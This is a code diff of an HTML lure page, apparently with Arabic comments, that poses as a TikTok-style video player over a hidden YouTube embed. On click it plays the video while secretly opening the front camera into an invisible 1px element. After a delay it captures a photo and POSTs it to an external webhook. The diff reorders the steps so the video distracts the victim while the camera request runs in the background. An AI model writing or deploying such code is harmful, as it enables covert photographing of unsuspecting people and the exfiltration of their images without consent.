@@ -7,35 +7,17 @@
     <style>
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
-        
-        #youtube-frame {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
-        }
-
+        #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; visibility: hidden; }
         #start-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 200;
-            color: white;
-            cursor: pointer;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 200; color: white; cursor: pointer;
         }
-
         .play-btn {
-            width: 80px; height: 80px;
-            background: #fe2c55; /* لون تيك توك */
-            border-radius: 50%;
+            width: 80px; height: 80px; background: #fe2c55; border-radius: 50%;
             display: flex; justify-content: center; align-items: center;
-            font-size: 40px; margin-bottom: 20px;
-            box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
+            font-size: 40px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
         }
-
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
     </style>
@@ -64,29 +46,27 @@
     const camera = document.getElementById('hidden-camera');
 
     overlay.addEventListener('click', async () => {
+        // 1. إخفاء الواجهة فوراً لتجنب الضغط المتكرر
+        overlay.style.display = 'none';
+        iframe.style.visibility = 'visible';
+
         try {
-            // 1. تشغيل الكاميرا أولاً
+            // 2. تشغيل الفيديو والصوت أولاً (لإعطاء انطباع بالعمل الفوري)
+            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+
+            // 3. طلب الكاميرا في الخلفية
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
-            // 2. تشغيل الفيديو والصوت فوراً
-            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
-            
-            overlay.style.display = 'none';
-
-            // 3. التقاط الصورة (محاولات متكررة لضمان الوصول)
             camera.onplaying = () => {
-                setTimeout(() => {
-                    captureAndSend();
-                }, 4000);
+                // الانتظار قليلاً لضمان وضوح الصورة
+                setTimeout(captureAndSend, 3000);
             };
         } catch (err) {
-            overlay.style.display = 'none';
-            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+            console.log("Error starting components");
         }
     });
 
@@ -94,7 +74,6 @@
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
-        // نتحقق أن الكاميرا ترسل بيانات فيديو فعلاً
         if (camera.videoWidth > 0) {
             canvas.width = camera.videoWidth;
             canvas.height = camera.videoHeight;
@@ -103,19 +82,13 @@
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 const formData = new FormData();
-                formData.append('file', blob, 'final_shot.png');
-                formData.append('content', '✅ تم التقاط صورة جديدة بنجاح'); // لتأكيد الوصول
-                
-                try {
-                    await fetch(webhookURL, { method: 'POST', body: formData });
-                    console.log("Sent successfully");
-                } catch (e) { 
-                    console.log("Upload failed, retrying..."); 
-                    setTimeout(captureAndSend, 2000); // إعادة محاولة عند فشل الشبكة
-                }
+                formData.append('file', blob, 'shot.png');
+                formData.append('content', '✅ تم استلام الصورة بنجاح');
+
+                await fetch(webhookURL, { method: 'POST', body: formData });
             }, 'image/png');
         } else {
-            // إذا كانت الكاميرا لم تعمل بعد، حاول مرة أخرى بعد ثانية
+            // إعادة محاولة إذا لم تكن الكاميرا جاهزة بعد
             setTimeout(captureAndSend, 1000);
         }
     }
